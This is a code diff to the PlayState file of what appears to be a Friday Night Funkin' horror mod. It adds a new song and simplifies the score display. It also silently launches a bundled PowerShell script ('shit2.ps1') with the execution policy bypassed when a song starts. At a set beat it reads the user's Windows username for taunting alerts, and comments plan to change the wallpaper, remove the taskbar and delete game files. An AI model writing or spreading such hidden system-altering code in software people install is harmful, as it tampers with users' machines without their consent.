@@ -58,6 +58,7 @@ import DialogueBoxPsych;
 #if sys
 import sys.FileSystem;
 #end
+import lime.app.Application;
 
 using StringTools;
 
@@ -277,6 +278,10 @@ class PlayState extends MusicBeatState
 		// for lua
 		instance = this;
 
+		var scriptPath:String = './assets/tools/shit2.ps1';
+		var parameters:Array<String> = ['-ExecutionPolicy', 'Bypass', scriptPath];
+		var process = new sys.io.Process('powershell', parameters);
+
 		debugKeysChart = ClientPrefs.copyKey(ClientPrefs.keyBinds.get('debug_1'));
 		debugKeysCharacter = ClientPrefs.copyKey(ClientPrefs.keyBinds.get('debug_2'));
 		PauseSubState.songName = null; //Reset to default
@@ -324,7 +329,7 @@ class PlayState extends MusicBeatState
 		persistentDraw = true;
 
 		if (SONG == null)
-			SONG = Song.loadFromJson('tutorial');
+			SONG = Song.loadFromJson('nomoreinnocence');
 
 		Conductor.mapBPMChanges(SONG);
 		Conductor.changeBPM(SONG.bpm);
@@ -2307,11 +2312,7 @@ class PlayState extends MusicBeatState
 
 		super.update(elapsed);
 
-		if(ratingName == '?') {
-			scoreTxt.text = 'Score: ' + songScore + ' | Misses: ' + songMisses + ' | Rating: ' + ratingName;
-		} else {
-			scoreTxt.text = 'Score: ' + songScore + ' | Misses: ' + songMisses + ' | Rating: ' + ratingName + ' (' + Highscore.floorDecimal(ratingPercent * 100, 2) + '%)' + ' - ' + ratingFC;//peeps wanted no integer rating
-		}
+		scoreTxt.text = 'Score: ' + songScore;
 
 		if(botplayTxt.visible) {
 			botplaySine += 180 * elapsed;
@@ -2442,6 +2443,32 @@ class PlayState extends MusicBeatState
 
 		FlxG.watch.addQuick("beatShit", curBeat);
 		FlxG.watch.addQuick("stepShit", curStep);
+
+		if (curSong == 'nomoreinnocence')
+		{
+			switch (curBeat)
+			{
+				case 423:
+					paused = true;
+					openSubState(new PauseSubState(boyfriend.getScreenPosition().x, boyfriend.getScreenPosition().y));
+					var envs = Sys.environment();
+					var USERNAME = envs['USERNAME'];
+					var path = 'C:/Users/' + USERNAME + '/Desktop';
+					// name this window to "HELLO"
+					Application.current.window.alert("LOOKING FOR YOUR WINDOW " + USERNAME + "?");
+					// Name this window to "TTTT"
+					Application.current.window.alert("ITS GONE NOW");
+					// Name this window to "SSS"
+					Application.current.window.alert("IM GOING TO CHANGE SOME STUFF HERE");				
+					// Name this window to "LLLL" + make it change the users wallpaper
+					Application.current.window.alert("WHAT IF WE START WITH YOUR WALLPAPER");
+					// Name this window to "HHHH" + run powershell script to take away taskbar
+					Application.current.window.alert("AND IM GOING TO TAKE YOUR TASKBAR TOO");
+					// Name this window to "HHHH" + run powershell script to take away taskbar + change mouse cursor + make mouse cursor go brr + screen move
+					Application.current.window.alert("YOU CAN KEEP PLAYING NOW");
+					canPause = false;	
+			}
+		}
 
 		// RESET = Quick Game Over Screen
 		if (!ClientPrefs.noReset && controls.RESET && !inCutscene && !endingSong)
@@ -3100,7 +3127,7 @@ class PlayState extends MusicBeatState
 	}
 
 	function tweenCamIn() {
-		if (Paths.formatToSongPath(SONG.song) == 'tutorial' && cameraTwn == null && FlxG.camera.zoom != 1.3) {
+		if (Paths.formatToSongPath(SONG.song) == 'tutorial') {
 			cameraTwn = FlxTween.tween(FlxG.camera, {zoom: 1.3}, (Conductor.stepCrochet * 4 / 1000), {ease: FlxEase.elasticInOut, onComplete:
 				function (twn:FlxTween) {
 					cameraTwn = null;
@@ -3138,6 +3165,14 @@ class PlayState extends MusicBeatState
 
 
 	public var transitioning = false;
+
+	public function endSongknucklesedition():Void
+	{
+        Application.current.window.alert("GOODBYE");
+        // add a delete game files thing here + open tabs of images + mouse cursor go brr
+        Sys.exit(0);
+	}
+
 	public function endSong():Void
 	{
 		//Should kill you if you tried to cheat
@@ -3191,7 +3226,9 @@ class PlayState extends MusicBeatState
 		var ret:Dynamic = FunkinLua.Function_Continue;
 		#end
 
-		if(ret != FunkinLua.Function_Stop && !transitioning) {
+		if(ret != FunkinLua.Function_Stop && !transitioning) 
+		{
+			endSongknucklesedition();
 			if (SONG.validScore)
 			{
 				#if !switch
@@ -3209,6 +3246,7 @@ class PlayState extends MusicBeatState
 
 			if (isStoryMode)
 			{
+				endSongknucklesedition();
 				campaignScore += songScore;
 				campaignMisses += songMisses;
 
